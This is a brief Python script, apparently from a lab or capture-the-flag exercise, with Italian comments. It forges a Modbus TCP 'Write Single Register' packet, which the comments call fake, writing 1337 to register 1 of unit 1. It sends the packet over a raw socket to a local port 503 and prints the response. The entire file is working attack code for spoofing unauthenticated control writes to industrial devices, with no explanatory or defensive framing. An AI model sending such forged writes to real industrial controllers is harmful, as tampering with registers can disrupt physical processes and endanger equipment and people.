from scapy.all import *
import socket

def fabricate_modbus_write():
    # Costruzione di un pacchetto Modbus TCP falso
    transaction_id = b'\x12\x34'  # Transaction ID casuale
    protocol_id = b'\x00\x00'  # Protocol ID (sempre 0 per Modbus TCP)
    length = b'\x00\x06'  # Lunghezza del payload (6 byte)
    unit_id = b'\x01'  # Identificatore del dispositivo slave
    function_code = b'\x06'  # Write Single Register (0x06)
    register_address = b'\x00\x01'  # Indirizzo del registro (0x0001)
    register_value = b'\x05\x39'  # Valore da scrivere (0x0539 = 1337 in decimale)

    modbus_fabrication = transaction_id + protocol_id + length + unit_id + function_code + register_address + register_value

    # Invio del pacchetto fasullo
    server_ip = "127.0.0.1"
    server_port = 503

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((server_ip, server_port))
    sock.send(modbus_fabrication)

    response = sock.recv(1024)  # Ricevi la risposta dallo slave
    sock.close()

    return response

# Invio della richiesta
response = fabricate_modbus_write()
print(response)
